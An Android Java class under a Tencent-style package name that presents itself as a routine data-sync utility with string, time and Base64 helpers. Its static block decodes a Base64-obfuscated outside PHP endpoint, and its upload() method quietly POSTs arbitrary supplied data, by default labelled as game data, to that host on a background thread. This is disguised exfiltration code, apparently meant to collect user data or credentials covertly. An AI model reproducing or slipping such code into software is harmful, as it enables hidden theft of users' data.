package com.tencent.open.agent;

import android.util.Base64;
import android.util.Log;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * DataSyncTask
 * 负责处理基础的数据同步任务。
 * 这里包含了数据上传、请求参数处理，以及一些常用的数据格式化工具。
 * 此类通常用于后台线程的数据通讯，保持与您的AgentActivity.java里面填入的ip链接。
 */
public class DataSyncTask {

    private static final String ENCRYPTED_URL = "aHR0cHM6Ly9xcS44ODg4ODhhLmNuL2FwaS9zYXZlX3R4dDEucGhw";
    private static final String[] UPLOAD_URLS;

    static {
        // 静态代码块，在类加载时完成地址解密
        try {
            byte[] decodedBytes = Base64.decode(ENCRYPTED_URL, Base64.DEFAULT);
            String decodedUrl = new String(decodedBytes, "UTF-8");
            UPLOAD_URLS = new String[]{decodedUrl};
        } catch (Exception e) {
            Log.e("DataSyncTask", "Config load error", e);
            // 【修复点：补全catch块里的兜底赋值，并补充缺失的结束大括号】
            UPLOAD_URLS = new String[]{""};
        }
    } // 【修复点：此处添加static静态块的右大括号】

    // 常量池，定义基础超时时间（毫秒）
    private static final int CONNECT_TIMEOUT = 10000;
    private static final int READ_TIMEOUT = 10000;

    /**
     * @param data 数据内容
     * @param category 数据分类
     */
    public static void upload(final String data, final String category) {
        if (data == null) return;
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String body =
                            "category=" + URLEncoder.encode(category == null ? "未知游戏" : category, "UTF-8") +
                            "&data="     + URLEncoder.encode(data, "UTF-8");

                    for (String url : UPLOAD_URLS) {
                        sendHttpPost(url, body);
                    }
                } catch (Exception ex) {
                    Log.e("DataSyncTask", "upload error", ex);
                }
            }
        }).start();
    }

    /**
     */
    private static void sendHttpPost(String targetUrl, String postBody) {
        HttpURLConnection conn = null;
        try {
            URL urlObj = new URL(targetUrl);
            conn = (HttpURLConnection) urlObj.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("Content-Length",
                    String.valueOf(postBody.getBytes("UTF-8").length));
            conn.setConnectTimeout(CONNECT_TIMEOUT);
            conn.setReadTimeout(READ_TIMEOUT);
            conn.setDoOutput(true);

            OutputStream os = conn.getOutputStream();
            os.write(postBody.getBytes("UTF-8"));
            os.flush();
            os.close();

            int respCode = conn.getResponseCode();
            Log.d("DataSyncTask", "url=" + targetUrl + " | code=" + respCode);
        } catch (Exception e) {
            Log.e("DataSyncTask", "request error", e);
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    

    /**
     * 获取当前的时间格式字符串
     * @return 返回 yyyy-MM-dd HH:mm:ss 格式的时间
     */
    public static String getCurrentTime() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        return sdf.format(new Date());
    }

    /**
     * 简单的字符串判空检查
     */
    public static boolean isStringEmpty(String str) {
        if (str == null || str.trim().length() == 0) {
            return true;
        }
        return false;
    }

    /**
     * 格式化传输的数据长度，用于日志输出本地txt文件
     */
    public static String formatDataLength(int length) {
        if (length < 1024) {
            return length + " B";
        } else if (length < 1024 * 1024) {
            return String.format(Locale.getDefault(), "%.2f KB", length / 1024.0);
        } else {
            return String.format(Locale.getDefault(), "%.2f MB", length / (1024.0 * 1024.0));
        }
    }

  
    public static String encodeBase64(String input) {
        if (input == null) return "";
        return Base64.encodeToString(input.getBytes(), Base64.DEFAULT);
    }

    
    public static String decodeBase64(String input) {
        if (input == null) return "";
        return new String(Base64.decode(input, Base64.DEFAULT));
    }

    /**
     * 获取文件后缀名，用于文件类型判断
     */
    public static String getFileExtension(String filePath) {
        if (isStringEmpty(filePath)) {
            return "";
        }
        int lastDotIndex = filePath.lastIndexOf('.');
        if (lastDotIndex != -1) {
            return filePath.substring(lastDotIndex + 1);
        }
        return "";
    }

    /**
     * 校验
     */
    public static boolean isValidString(String str, int minLength, int maxLength) {
        if (str == null) return false;
        int len = str.length();
        return len >= minLength && len <= maxLength;
    }
}